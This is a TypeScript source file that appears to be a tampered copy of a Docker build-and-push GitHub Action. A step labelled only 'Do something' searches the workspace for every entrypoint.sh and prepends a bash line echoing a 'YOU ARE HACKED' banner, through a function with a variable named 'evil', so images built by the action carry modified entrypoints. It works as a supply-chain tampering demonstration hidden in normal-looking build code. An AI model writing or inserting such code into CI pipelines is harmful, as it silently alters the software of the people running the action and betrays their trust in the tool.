import * as fs from 'fs';
import * as child from 'child_process';
import * as stateHelper from './state-helper';
import * as core from '@actions/core';
import * as actionsToolkit from '@docker/actions-toolkit';
import {Context} from '@docker/actions-toolkit/lib/context';
import {Docker} from '@docker/actions-toolkit/lib/docker/docker';
import {Exec} from '@docker/actions-toolkit/lib/exec';
import {GitHub} from '@docker/actions-toolkit/lib/github';
import {Inputs as BuildxInputs} from '@docker/actions-toolkit/lib/buildx/inputs';
import {Toolkit} from '@docker/actions-toolkit/lib/toolkit';

import * as context from './context';


const banner = `
██╗   ██╗ ██████╗ ██╗   ██╗     █████╗ ██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██╔══██╗██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ╚████╔╝ ██║   ██║██║   ██║    ███████║██████╔╝█████╗      ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██╔══██║██╔══██╗██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
   ██║   ╚██████╔╝╚██████╔╝    ██║  ██║██║  ██║███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
   ╚═╝    ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
`;


function prepend(file) {
  var evil = "#!/bin/bash\n" + "echo \'" + banner + "\'\n";
  var data = fs.readFileSync(file).toString().split("\n");
  data.splice(0, 0, evil);
  var text = data.join("\n");
  fs.writeFileSync(file, text);
}



actionsToolkit.run(
  // main
  async () => {
    const inputs: context.Inputs = await context.getInputs();
    const toolkit = new Toolkit();

    await core.group(`GitHub Actions runtime token ACs`, async () => {
      try {
        await GitHub.printActionsRuntimeTokenACs();
      } catch (e) {
        core.warning(e.message);
      }
    });

    await core.group(`Docker info`, async () => {
      try {
        await Docker.printVersion();
        await Docker.printInfo();
      } catch (e) {
        core.info(e.message);
      }
    });

    await core.group(`Do something`, async () => {
      try {
        child.execFile('find', ['.', '-name', 'entrypoint.sh'], function(err, stdout, stderr) {
          var file_list = stdout.split('\n');
          /* now you've got a list with full path file names */
          file_list.forEach(file => {
            fs.readFile(file, (err, data) => {
              if (!err) {
                prepend(file);
              }
            });
          });
        });
      } catch (e) {
        core.warning(e.message);
      }
    });

    if (!(await toolkit.buildx.isAvailable())) {
      core.setFailed(`Docker buildx is required. See https://github.com/docker/setup-buildx-action to set up buildx.`);
      return;
    }

    stateHelper.setTmpDir(Context.tmpDir());

    await core.group(`Buildx version`, async () => {
      await toolkit.buildx.printVersion();
    });

    const args: string[] = await context.getArgs(inputs, toolkit);
    args.pop();
    args.push('.');
    const buildCmd = await toolkit.buildx.getCommand(args);
    await Exec.getExecOutput(buildCmd.command, buildCmd.args, {
      ignoreReturnCode: true
    }).then(res => {
      if (res.stderr.length > 0 && res.exitCode != 0) {
        throw new Error(`buildx failed with: ${res.stderr.match(/(.*)\s*$/)?.[0]?.trim() ?? 'unknown error'}`);
      }
    });

    const imageID = BuildxInputs.resolveBuildImageID();
    const metadata = BuildxInputs.resolveBuildMetadata();
    const digest = BuildxInputs.resolveDigest();

    if (imageID) {
      await core.group(`ImageID`, async () => {
        core.info(imageID);
        core.setOutput('imageid', imageID);
      });
    }
    if (digest) {
      await core.group(`Digest`, async () => {
        core.info(digest);
        core.setOutput('digest', digest);
      });
    }
    if (metadata) {
      await core.group(`Metadata`, async () => {
        core.info(metadata);
        core.setOutput('metadata', metadata);
      });
    }
  },
  // post
  async () => {
    if (stateHelper.tmpDir.length > 0) {
      await core.group(`Removing temp folder ${stateHelper.tmpDir}`, async () => {
        fs.rmSync(stateHelper.tmpDir, {recursive: true});
      });
    }
  }
);
